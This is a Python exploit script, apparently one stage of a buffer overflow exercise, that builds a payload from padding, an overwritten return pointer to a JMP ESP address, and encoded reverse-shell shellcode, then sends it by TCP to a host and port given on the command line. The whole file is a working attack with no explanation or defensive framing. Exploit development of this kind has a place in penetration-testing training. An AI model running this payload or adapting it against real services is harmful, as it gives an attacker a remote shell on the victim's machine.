#!/usr/bin/env python3
# stage 6 verify RET 
import socket,sys,struct


RHOST = sys.argv[1]
RPORT = int(sys.argv[2])


# reverse shellcode 
shellcode =  b""
shellcode += b"\xda\xc2\xb8\x1b\x9f\x50\xdd\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x46\x17\x83\xc6\x04"
shellcode += b"\x03\x5d\x8c\xb2\x28\x9d\x5a\xb0\xd3\x5d\x9b"
shellcode += b"\xd5\x5a\xb8\xaa\xd5\x39\xc9\x9d\xe5\x4a\x9f"
shellcode += b"\x11\x8d\x1f\x0b\xa1\xe3\xb7\x3c\x02\x49\xee"
shellcode += b"\x73\x93\xe2\xd2\x12\x17\xf9\x06\xf4\x26\x32"
shellcode += b"\x5b\xf5\x6f\x2f\x96\xa7\x38\x3b\x05\x57\x4c"
shellcode += b"\x71\x96\xdc\x1e\x97\x9e\x01\xd6\x96\x8f\x94"
shellcode += b"\x6c\xc1\x0f\x17\xa0\x79\x06\x0f\xa5\x44\xd0"
shellcode += b"\xa4\x1d\x32\xe3\x6c\x6c\xbb\x48\x51\x40\x4e"
shellcode += b"\x90\x96\x67\xb1\xe7\xee\x9b\x4c\xf0\x35\xe1"
shellcode += b"\x8a\x75\xad\x41\x58\x2d\x09\x73\x8d\xa8\xda"
shellcode += b"\x7f\x7a\xbe\x84\x63\x7d\x13\xbf\x98\xf6\x92"
shellcode += b"\x6f\x29\x4c\xb1\xab\x71\x16\xd8\xea\xdf\xf9"
shellcode += b"\xe5\xec\xbf\xa6\x43\x67\x2d\xb2\xf9\x2a\x3a"
shellcode += b"\x77\x30\xd4\xba\x1f\x43\xa7\x88\x80\xff\x2f"
shellcode += b"\xa1\x49\x26\xa8\xc6\x63\x9e\x26\x39\x8c\xdf"
shellcode += b"\x6f\xfe\xd8\x8f\x07\xd7\x60\x44\xd7\xd8\xb4"
shellcode += b"\xcb\x87\x76\x67\xac\x77\x37\xd7\x44\x9d\xb8"
shellcode += b"\x08\x74\x9e\x12\x21\x1f\x65\xf5\x8e\x48\xa5"
shellcode += b"\x83\x67\x8b\x25\x8d\xcc\x02\xc3\xe7\x22\x43"
shellcode += b"\x5c\x90\xdb\xce\x16\x01\x23\xc5\x53\x01\xaf"
shellcode += b"\xea\xa4\xcc\x58\x86\xb6\xb9\xa8\xdd\xe4\x6c"
shellcode += b"\xb6\xcb\x80\xf3\x25\x90\x50\x7d\x56\x0f\x07"
shellcode += b"\x2a\xa8\x46\xcd\xc6\x93\xf0\xf3\x1a\x45\x3a"
shellcode += b"\xb7\xc0\xb6\xc5\x36\x84\x83\xe1\x28\x50\x0b"
shellcode += b"\xae\x1c\x0c\x5a\x78\xca\xea\x34\xca\xa4\xa4"
shellcode += b"\xeb\x84\x20\x30\xc0\x16\x36\x3d\x0d\xe1\xd6"
shellcode += b"\x8c\xf8\xb4\xe9\x21\x6d\x31\x92\x5f\x0d\xbe"
shellcode += b"\x49\xe4\x2d\x5d\x5b\x11\xc6\xf8\x0e\x98\x8b"
shellcode += b"\xfa\xe5\xdf\xb5\x78\x0f\xa0\x41\x60\x7a\xa5"
shellcode += b"\x0e\x26\x97\xd7\x1f\xc3\x97\x44\x1f\xc6"


# handle payload 
offset = 146
total_buff_size = 650 
pointer_to_jmp_esp = 0x080414C3 


# move ESP up the stack
sub_esp_10 = b"\x83\xec\x10"

buff          = b""
lead_padding  = b"\x41" * (offset - len(buff))                 # begin buffer padding
eip           = struct.pack("<I", pointer_to_jmp_esp)          # saved return pointer overwrite (EIP/SRP) 
esp           = sub_esp_10                                     # where esp should be pointing
trail_padding = b"\x44" * (total_buff_size - len(buff))
postfix       = b"\n"              


# handle payload
buff += lead_padding 
buff += eip 
buff += esp 
buff += shellcode
buff += trail_padding 
buff += postfix


# handle connection
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(buff)
s.close()
